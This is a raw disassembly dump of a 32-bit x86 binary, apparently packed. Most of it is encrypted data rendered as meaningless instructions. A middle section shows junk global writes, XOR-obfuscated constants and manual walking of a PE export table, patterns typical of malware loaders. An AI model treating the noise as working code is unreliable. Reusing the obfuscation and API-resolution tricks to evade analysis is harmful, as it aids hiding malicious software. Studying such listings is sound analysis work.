  4062b9:	and    al,0x75
  4062bb:	cmp    dh,0x96
  4062be:	fistp  WORD PTR [edi]
  4062c0:	in     eax,0xc7
  4062c2:	inc    edi
  4062c3:	push   esp
  4062c4:	cmp    ax,0xfd5e
  4062c8:	sbb    ch,BYTE PTR [edx-0x7737c05f]
  4062ce:	pop    esi
  4062cf:	rol    DWORD PTR [esi],0x9b
  4062d2:	xor    eax,0x98d89d7c
  4062d7:	xor    BYTE PTR [edx+0x0],dh
  4062da:	push   esi
  4062db:	mov    bh,0x45
  4062dd:	scas   eax,DWORD PTR es:[edi]
  4062de:	shl    BYTE PTR [ebx+0xf8ad73e],1
  4062e4:	mov    cl,0x80
  4062e6:	or     eax,DWORD PTR ds:0xbf589847
  4062ec:	lods   al,BYTE PTR ds:[esi]
  4062ed:	cdq    
  4062ee:	pop    ebp
  4062ef:	dec    ebp
  4062f0:	daa    
  4062f1:	in     al,0xbf
  4062f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062f4:	jmp    0x73ee0bbd
  4062f9:	push   cs
  4062fa:	cmc    
  4062fb:	mov    al,ds:0xaa94c4e9
  406300:	sbb    al,0x1c
  406302:	out    dx,eax
  406303:	jp     0x4062d3
  406305:	mov    edx,0x9b9c0d01
  40630a:	mov    al,BYTE PTR [edi]
  40630c:	xor    bl,ah
  40630e:	xchg   esp,eax
  40630f:	cmp    al,0xb8
  406311:	sbb    ebx,DWORD PTR [ebx-0x50fe8af8]
  406317:	cmp    dl,dh
  406319:	leave  
  40631a:	push   0x4a
  40631c:	and    bl,ah
  40631e:	imul   edx,DWORD PTR [eax-0x4a2d315f],0xffffffc6
  406325:	push   ebx
  406326:	into   
  406327:	sub    esi,ecx
  406329:	sub    BYTE PTR [edx+0x1a911c2a],al
  40632f:	xor    BYTE PTR [edx+0x2b1e18be],0x38
  406336:	(bad)  
  406337:	cmp    BYTE PTR [edi+0x32],dh
  40633a:	(bad)  
  40633c:	repz add BYTE PTR [ebx-0x2ee308fd],bl
  406343:	xor    cl,BYTE PTR [esi]
  406345:	sub    eax,0x96940249
  40634a:	fld    TBYTE PTR [edi+0x6d9ac067]
  406350:	push   ebx
  406351:	in     eax,0xe3
  406353:	mov    ds:0x485131f1,eax
  406358:	jecxz  0x4063c9
  40635a:	cmp    DWORD PTR [ebx],eax
  40635c:	lock gs push edx
  40635f:	jle    0x406381
  406361:	push   cs
  406362:	sbb    edi,ebx
  406364:	sub    eax,0x5e759f77
  406369:	inc    ebp
  40636a:	pop    esp
  40636b:	loope  0x40631b
  40636d:	frstor [ebx]
  40636f:	lea    edi,[ebp+ecx*8-0x10]
  406373:	jmp    0x9960:0x240282e2
  40637a:	arpl   cx,cx
  40637c:	bound  ecx,QWORD PTR [eax]
  40637e:	jo     0x406359
  406380:	sub    edx,DWORD PTR [esi+0xd]
  406383:	pop    esp
  406384:	inc    esi
  406385:	jo     0x406364
  406387:	add    ecx,DWORD PTR [ebx]
  406389:	aas    
  40638a:	aad    0x73
  40638c:	int3   
  40638d:	add    eax,0x2222d715
  406392:	ja     0x406410
  406394:	xchg   ecx,eax
  406395:	inc    esi
  406396:	adc    dl,BYTE PTR [edi-0x4dd351b6]
  40639c:	cmp    ah,BYTE PTR [edx]
  40639e:	xor    al,0x85
  4063a0:	sbb    edi,DWORD PTR [ecx]
  4063a2:	mov    al,0x62
  4063a4:	adc    DWORD PTR [ecx+eax*1],eax
  4063a7:	jmp    0x4cfd3ed9
  4063ac:	(bad)  
  4063ad:	or     DWORD PTR [edi],edi
  4063af:	aas    
  4063b0:	inc    ebx
  4063b1:	paddd  mm3,mm4
  4063b4:	mov    ebp,0xf0a1a852
  4063b9:	(bad)  
  4063bb:	mov    ds,edx
  4063bd:	mov    ds:0xbe028fd5,eax
  4063c2:	cs xchg edx,eax
  4063c4:	ss pop ds
  4063c6:	jbe    0x4063f7
  4063c8:	das    
  4063c9:	push   es
  4063ca:	dec    edx
  4063cb:	fist   WORD PTR [ebx]
  4063cd:	push   esi
  4063ce:	xor    DWORD PTR [eax-0x1c27520],esp
  4063d4:	pop    ebp
  4063d5:	pop    ebp
  4063d6:	pop    ss
  4063d7:	out    0x4f,eax
  4063d9:	push   edi
  4063da:	inc    ecx
  4063db:	cmp    DWORD PTR [ebx],esp
  4063dd:	mov    esp,0xcf4ff5a1
  4063e2:	push   esi
  4063e3:	(bad)  
  4063e4:	or     eax,0xacbeae65
  4063e9:	mov    DWORD PTR [edx-0x53d49a50],eax
  4063ef:	out    0x4,al
  4063f1:	jo     0x40641e
  4063f3:	lods   eax,DWORD PTR ds:[esi]
  4063f4:	xchg   ecx,eax
  4063f5:	pop    ds
  4063f6:	jle    0x406384
  4063f8:	pop    es
  4063f9:	and    DWORD PTR [ebx+0x7],ebp
  4063fc:	sbb    eax,0x20b88f7e
  406401:	and    eax,0xb23a4227
  406406:	dec    eax
  406407:	sbb    DWORD PTR [edx+0xa],ebp
  40640a:	cdq    
  40640b:	jns    0x406395
  40640d:	sbb    al,BYTE PTR [ecx]
  40640f:	jnp    0x4063c4
  406411:	push   edi
  406412:	jl     0x4063d8
  406414:	and    esp,0xd0d7a360
  40641a:	out    dx,eax
  40641b:	inc    ecx
  40641c:	cmc    
  40641d:	mov    eax,0xb10bac29
  406422:	mov    al,es:0x30267bbf
  406428:	int3   
  406429:	jo     0x406495
  40642b:	adc    DWORD PTR [eax*8+0x40bc619e],ebp
  406432:	cmp    DWORD PTR [ebx+eax*2+0x7cd5a10b],esp
  406439:	xor    bh,BYTE PTR [edi-0x61b5bcab]
  40643f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406440:	in     al,dx
  406441:	jl     0x4063fd
  406443:	stc    
  406444:	ss je  0x4064a7
  406447:	in     eax,dx
  406448:	jmp    DWORD PTR [ecx-0x73]
  40644b:	lods   eax,DWORD PTR ds:[esi]
  40644c:	outs   dx,DWORD PTR cs:[esi]
  40644e:	lea    edx,[edi-0x50]
  406451:	les    esp,FWORD PTR [eax+edi*1]
  406454:	aaa    
  406455:	dec    esp
  406456:	pop    esp
  406457:	and    eax,0x6066a583
  40645c:	ins    DWORD PTR es:[edi],dx
  40645d:	xchg   edx,eax
  40645e:	in     al,0x70
  406460:	push   edi
  406461:	sbb    edi,DWORD PTR [esi]
  406463:	loop   0x40641e
  406465:	xor    edx,DWORD PTR [ebx-0x76]
  406468:	adc    ebx,DWORD PTR [edi]
  40646a:	jmp    0x326c638b
  40646f:	jno    0x40649e
  406471:	das    
  406472:	add    eax,0x606ef22b
  406478:	jb     0x406494
  40647a:	fisub  DWORD PTR [edi+0x54613a30]
  406480:	xchg   esp,eax
  406481:	adc    edi,ecx
  406483:	push   es
  406484:	mov    dl,0xc7
  406486:	sub    ch,dh
  406488:	sahf   
  406489:	and    al,0x92
  40648b:	cwde   
  40648c:	push   ss
  40648d:	push   0xffffffff
  40648f:	adc    DWORD PTR [edx-0xe],esp
  406492:	mov    ah,BYTE PTR es:[ebp+0xc]
  406496:	std    
  406497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406499:	pop    ss
  40649a:	mov    WORD PTR [eax+esi*1+0x7ff153e8],gs
  4064a1:	mov    bh,0x16
  4064a3:	pop    esi
  4064a4:	push   esi
  4064a5:	in     al,dx
  4064a6:	or     ch,cl
  4064a8:	fcomp  QWORD PTR [ecx-0x53]
  4064ab:	dec    edx
  4064ac:	retf   0x17a9
  4064af:	inc    ebx
  4064b0:	push   ebx
  4064b1:	mov    edx,0x2b30656b
  4064b6:	stos   BYTE PTR es:[edi],al
  4064b7:	bound  edx,QWORD PTR [esp+ecx*2]
  4064ba:	cwde   
  4064bb:	ja     0x4064a3
  4064bd:	xchg   ebx,eax
  4064be:	js     0x406521
  4064c0:	aam    0xbf
  4064c2:	jmp    0x406487
  4064c4:	sbb    DWORD PTR [ebx-0x75],edx
  4064c7:	push   ebx
  4064c8:	add    BYTE PTR [eax+0x347fbeb0],al
  4064ce:	xor    dh,BYTE PTR [ebp-0x28]
  4064d1:	mov    al,ds:0x3c0e601f
  4064d6:	jmp    0xc2e8:0x10a31ca6
  4064dd:	mov    bl,0xd9
  4064df:	jno    0x406533
  4064e1:	mov    dh,0x42
  4064e3:	imul   edi,DWORD PTR [eax-0x576951b1],0xa213d9d
  4064ed:	pop    ds
  4064ee:	(bad)  
  4064ef:	je     0x40650e
  4064f1:	sbb    DWORD PTR [eax+eiz*1],esp
  4064f4:	cs dec ecx
  4064f6:	pop    es
  4064f7:	xor    esi,ebp
  4064f9:	sbb    ch,BYTE PTR ds:0xe863e2d3
  4064ff:	adc    eax,0xe0803ae2
  406504:	mov    ah,0x39
  406506:	and    eax,0x4dc42956
  40650b:	sbb    eax,esp
  40650d:	mov    al,0xdd
  40650f:	jb     0x40649a
  406511:	dec    ebp
  406512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406513:	test   DWORD PTR [esi+eax*4+0x63],eax
  406517:	outs   dx,DWORD PTR ds:[esi]
  406518:	or     al,0xff
  40651a:	scas   eax,DWORD PTR es:[edi]
  40651b:	xor    dl,BYTE PTR [ebx+ebp*2+0x1f]
  40651f:	inc    ebp
  406520:	xchg   ebx,eax
  406521:	jb     0x40651d
  406523:	outs   dx,DWORD PTR ds:[esi]
  406524:	and    eax,0x54cd7140
  406529:	jmp    0xf1e68e5f
  40652e:	cli    
  40652f:	rcl    DWORD PTR [eax+ebx*8+0x305abcf8],1
  406536:	test   cl,al
  406538:	jmp    0x7b2b:0x5beed09b
  40653f:	jno    0x406586
  406541:	mov    esp,0xe02136d5
  406546:	outs   dx,DWORD PTR ds:[esi]
  406547:	test   al,0x52
  406549:	fild   DWORD PTR [edx+esi*2+0x21]
  40654d:	fld    TBYTE PTR [eax+esi*2-0x24]
  406551:	test   eax,0x2c63b56
  406556:	add    dl,bl
  406558:	xchg   BYTE PTR [edx],dl
  40655a:	xlat   BYTE PTR ds:[ebx]
  40655b:	add    ecx,DWORD PTR ds:0xcb71b96
  406561:	mov    cs,WORD PTR [ebx]
  406563:	call   0x228ce28a
  406568:	sub    ecx,DWORD PTR [esi+0x6e]
  40656b:	loope  0x4064f4
  40656d:	mov    dh,0x38
  40656f:	(bad)  
  406570:	in     al,0x5d
  406572:	cmc    
  406573:	push   cs
  406574:	add    BYTE PTR [edi],cl
  406576:	(bad)  
  406577:	jae    0x406501
  406579:	pusha  
  40657a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40657b:	mov    ch,dh
  40657d:	or     al,0x19
  40657f:	xchg   edi,eax
  406580:	(bad)  
  406581:	adc    eax,0x996aa3e1
  406586:	cmc    
  406587:	sahf   
  406588:	ins    DWORD PTR es:[edi],dx
  406589:	mov    ds:0x78a5367a,al
  40658e:	adc    eax,0xc202f276
  406594:	mov    eax,gs:0x2cf491d5
  40659a:	cwde   
  40659b:	fcomp  DWORD PTR [ecx+0x67]
  40659e:	jne    0x4065e6
  4065a0:	lsl    ecx,cx
  4065a3:	ins    BYTE PTR es:[edi],dx
  4065a4:	cdq    
  4065a5:	fmul   QWORD PTR [edx-0x54]
  4065a8:	mov    esp,0x69f7bbf8
  4065ad:	xchg   edi,eax
  4065ae:	mov    edx,0xb5e9ae5e
  4065b3:	(bad)  
  4065b4:	stc    
  4065b5:	mov    bh,0xac
  4065b7:	or     BYTE PTR [eax],cl
  4065b9:	sbb    BYTE PTR [edi],0x7
  4065bc:	fsubr  st(5),st
  4065be:	sub    edi,DWORD PTR [edi]
  4065c0:	add    ecx,DWORD PTR [edi+0x758c8903]
  4065c6:	xchg   edx,eax
  4065c7:	and    eax,0xf0543016
  4065cc:	xchg   ebx,eax
  4065cd:	dec    eax
  4065ce:	shl    BYTE PTR [ecx],0x0
  4065d1:	aas    
  4065d2:	cli    
  4065d3:	loopne 0x406582
  4065d5:	nop
  4065d6:	sbb    eax,0xbf9ad58
  4065db:	push   edi
  4065dc:	inc    ebx
  4065dd:	int    0xc9
  4065df:	mov    ds:0x8296f325,al
  4065e4:	push   esp
  4065e5:	stos   BYTE PTR es:[edi],al
  4065e6:	cwde   
  4065e7:	mov    ds:0x25968d5f,eax
  4065ec:	(bad)  
  4065ed:	int    0xff
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d20c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42003f
  4066b7:	mov    edi,DWORD PTR ds:0x41d1d4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx-0x5],0xec
  4069c2:	dec    edx
  4069c3:	cmp    edx,eax
  4069c5:	cmp    al,0x62
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx+0x5c]
  4069cd:	push   0x4c1810b8
  4069d2:	xchg   edi,eax
  4069d3:	pusha  
  4069d4:	jnp    0x406961
  4069d6:	xor    BYTE PTR [edx-0x7411ff70],cl
  4069dc:	in     al,dx
  4069dd:	push   ebx
  4069de:	test   eax,0x82a4e19a
  4069e3:	push   eax
  4069e4:	in     eax,dx
  4069e5:	(bad)  
  4069e6:	in     eax,dx
  4069e7:	sub    BYTE PTR [edi+0x79],ch
  4069ea:	jmp    0x406a04
  4069ec:	call   0xe4da2e03
  4069f1:	xor    ecx,DWORD PTR [edi]
  4069f3:	rcr    BYTE PTR [esi+0xc78a503],1
  4069f9:	sbb    DWORD PTR [edi-0x42],ebx
  4069fc:	call   0xfc91:0xd7e89b28
  406a03:	mov    esp,0x2981fb2d
  406a08:	fisttp WORD PTR [eax]
  406a0a:	aaa    
  406a0b:	bound  eax,QWORD PTR [eax]
  406a0d:	cdq    
  406a0e:	call   0x72716910
  406a13:	lods   eax,DWORD PTR ds:[esi]
  406a14:	in     al,0x65
  406a16:	pop    ebp
  406a17:	ja     0x4069f7
  406a19:	xchg   ebx,eax
  406a1a:	push   0x77
  406a1c:	sub    ah,bl
  406a1e:	or     edi,DWORD PTR [edx+0x3]
  406a21:	mov    eax,ds:0xdcf55b6e
  406a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a27:	(bad)  
  406a28:	push   ss
  406a29:	sub    eax,0x828d4fcf
  406a2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a30:	scas   eax,DWORD PTR es:[edi]
  406a31:	fst    QWORD PTR [eax]
  406a33:	jge    0x4069d7
  406a35:	and    ch,BYTE PTR [esi]
  406a37:	xor    al,0xd1
  406a39:	loop   0x406aa5
  406a3b:	test   eax,0x8e67eaea
  406a40:	sahf   
  406a41:	sahf   
  406a42:	inc    ecx
  406a43:	add    eax,0xe41dd920
  406a48:	fdivp  st(2),st
  406a4a:	cs aad 0x13
  406a4d:	add    edx,esi
  406a4f:	add    dh,0xc0
  406a52:	int    0xb2
  406a54:	mov    ch,0xae
  406a56:	push   cs
  406a57:	fwait
  406a58:	mov    edx,0x23acfd33
  406a5d:	xchg   edi,eax
  406a5e:	sbb    al,0xe3
  406a60:	rcl    bl,1
  406a62:	or     BYTE PTR [edx-0x51],0x21
  406a66:	cmp    al,0xa8
  406a68:	inc    ebx
  406a69:	push   ds
  406a6a:	ss cmp al,0x84
  406a6d:	jnp    0x406ae5
  406a6f:	js     0x406a48
  406a71:	jp     0x406a0c
  406a73:	ins    BYTE PTR es:[edi],dx
  406a74:	fcom   QWORD PTR [ebp-0x783050cc]
  406a7a:	sbb    esi,DWORD PTR [esi+esi*2-0x6e]
  406a7e:	push   es
  406a7f:	inc    ebx
  406a80:	call   0xea90:0x4bb6b52c
  406a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a88:	xor    BYTE PTR [esi-0x460d3ff4],ah
  406a8e:	dec    ebp
  406a8f:	aaa    
  406a90:	adc    DWORD PTR [eax],esi
  406a92:	pop    esp
  406a93:	sbb    eax,0x40bfe569
  406a98:	dec    ebp
  406a99:	shl    BYTE PTR [ecx*4+0x201a51ba],1
  406aa0:	das    
  406aa1:	cli    
  406aa2:	je     0x406af0
  406aa4:	fist   WORD PTR [ebx-0x4fc56cbc]
  406aaa:	shl    DWORD PTR [ebx+eiz*2+0x6d],0xf5
  406aaf:	popa   
  406ab0:	cmp    BYTE PTR [edi+ecx*8-0x75],ch
  406ab4:	push   ebp
  406ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ab6:	or     eax,DWORD PTR [eax]
  406ab8:	cmp    ebp,edi
  406aba:	sub    eax,0x95fddabd
  406abf:	or     DWORD PTR [ebx+edx*2],0x8
  406ac3:	enter  0x4516,0xdc
  406ac7:	inc    edx
  406ac8:	fcmovne st,st(4)
  406aca:	push   ebx
  406acb:	daa    
  406acc:	enter  0x3fc2,0xb9
  406ad0:	mov    ah,0xf2
  406ad2:	ret    
  406ad3:	sar    DWORD PTR [ebx],cl
  406ad5:	or     BYTE PTR [eax],ah
  406ad7:	mov    ah,0xe
  406ad9:	mov    ss,WORD PTR [ebx]
  406adb:	inc    edx
  406adc:	inc    ebx
  406add:	and    BYTE PTR [edi+ebp*8-0x329b4358],dh
  406ae4:	or     al,0xcf
  406ae6:	jmp    0x406ad4
  406ae8:	call   0x4e1d7417
  406aed:	push   0x23
  406aef:	inc    ebx
  406af0:	(bad)
  406af4:	icebp  
  406af5:	adc    DWORD PTR [edx-0x37e522f5],edx
  406afb:	dec    ebx
  406afc:	out    0xd6,al
  406afe:	xor    DWORD PTR [edi],0x31d279c
  406b04:	(bad)  
  406b05:	cld    
  406b06:	out    dx,al
  406b07:	mov    BYTE PTR [edx-0x7],al
  406b0a:	fstp   QWORD PTR [edx+0x47]
  406b0d:	fwait
  406b0e:	mov    eax,0x5e2645b6
  406b13:	xor    BYTE PTR [edi],dl
  406b15:	nop
  406b16:	jb     0x406b33
  406b18:	push   ss
  406b19:	ds cmp al,0x30
  406b1c:	dec    esp
  406b1d:	jbe    0x406af8
  406b1f:	pop    ds
  406b20:	sub    edi,DWORD PTR [edi+0x42]
  406b23:	jecxz  0x406afb
  406b25:	je     0x406b40
  406b27:	sbb    ecx,DWORD PTR ds:0xd7244ba0
  406b2d:	ja     0x406ae5
  406b2f:	xor    eax,DWORD PTR fs:[eax]
  406b32:	mov    bh,BYTE PTR [ebp+0x15]
  406b35:	js     0x406b08
  406b37:	and    eax,0x57ef990c
  406b3c:	dec    ebx
  406b3d:	test   eax,0x23f3f3e8
  406b42:	dec    esi
  406b43:	xor    BYTE PTR [ebp-0x2bc983bc],al
  406b49:	sub    esp,DWORD PTR [edx-0x61515078]
  406b4f:	cwde   
  406b50:	clc    
  406b51:	inc    esi
  406b52:	inc    eax
  406b53:	sbb    dl,ch
  406b55:	sbb    eax,0x47842339
  406b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b5b:	mov    ds:0x2b75853,eax
  406b60:	cmp    ch,BYTE PTR [esp+edx*1]
